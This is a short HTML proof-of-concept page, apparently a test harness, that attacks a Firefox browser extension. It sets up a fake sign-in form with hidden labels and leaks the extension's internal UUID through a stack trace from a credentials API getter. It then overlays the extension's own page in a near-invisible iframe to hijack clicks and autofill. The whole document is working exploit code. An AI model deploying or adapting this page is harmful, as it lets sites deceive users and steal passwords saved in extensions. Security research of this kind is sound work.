<!doctype html><title>Claim</title><style>body{margin:0}label{font-size:0}#mine{position:fixed;left:100px;top:100px;width:320px;height:240px;border:0;opacity:0.001}</style><form id="f" action="#" onsubmit="event.preventDefault()"><label>Email <input id="user" name="email" autocomplete="username"></label><label>Password <input id="pass" name="password" type="password" autocomplete="current-password"></label><button id="go" type="submit">Sign in</button></form><script>window.__log=[];window.__state=()=>({user:document.getElementById('user')?.value,pass:document.getElementById('pass')?.value,log:window.__log,origin:self.origin});const q=new URLSearchParams(location.search);const opener=(id)=>{const el=document.getElementById(id);if(q.get('how')==='focus')el.focus();else el.dispatchEvent(new FocusEvent('focusin',{bubbles:true,composed:true}));};
function leak(){let stack='';try{navigator.credentials.get({get publicKey(){stack=new Error().stack;return undefined;}}).catch(()=>{});}catch(e){}const m=/moz-extension:\/\/([0-9a-f-]+)\//.exec(stack);window.__stack=stack;return m&&m[1];}
addEventListener('load',()=>setTimeout(()=>{const found=leak();window.__leak=found;const u=found||q.get('uuid');if(u){const f=document.createElement('iframe');f.id='mine';f.src='moz-extension://'+u+'/'+(q.get('page')||'menu.html');document.body.appendChild(f);}},600));</script>
